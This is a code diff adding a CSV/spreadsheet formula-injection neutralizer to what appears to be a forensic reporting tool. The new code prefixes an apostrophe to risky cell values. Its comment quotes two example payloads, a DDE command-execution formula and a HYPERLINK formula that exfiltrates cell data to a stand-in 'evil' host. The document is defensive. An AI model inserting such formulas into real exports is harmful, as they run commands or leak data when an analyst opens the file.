@@ -133,3 +133,24 @@ SUSPICIOUS_TOKENS: tuple[str, ...] = (
 def find_suspicious_tokens(text: str, tokens: Iterable[str] = SUSPICIOUS_TOKENS) -> list[str]:
     low = text.lower()
     return [t for t in tokens if t in low]
+
+
+# ----------------------------------------------------------------------------
+# Spreadsheet formula-injection (CSV/DDE) neutralization
+# ----------------------------------------------------------------------------
+# Excel / LibreOffice evaluate a cell as a formula when its first character is
+# one of these. Forensic fields (usernames, GECOS, log lines, commands, SNI,
+# user-agents) are ATTACKER-controlled, so a value like
+# ``=cmd|'/c calc'!A1`` or ``=HYPERLINK("http://evil/?"&A1)`` would execute /
+# exfiltrate when an analyst opens findings.csv / timeline.csv / the XLSX.
+# Prefixing a single quote makes the spreadsheet treat the cell as literal
+# text (the apostrophe is not shown). See OWASP "CSV Injection".
+_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def neutralize_formula(value):
+    """Return ``value`` with a leading apostrophe if it could be interpreted
+    as a spreadsheet formula. Non-string values pass through unchanged."""
+    if isinstance(value, str) and value[:1] in _FORMULA_TRIGGERS:
+        return "'" + value
+    return value
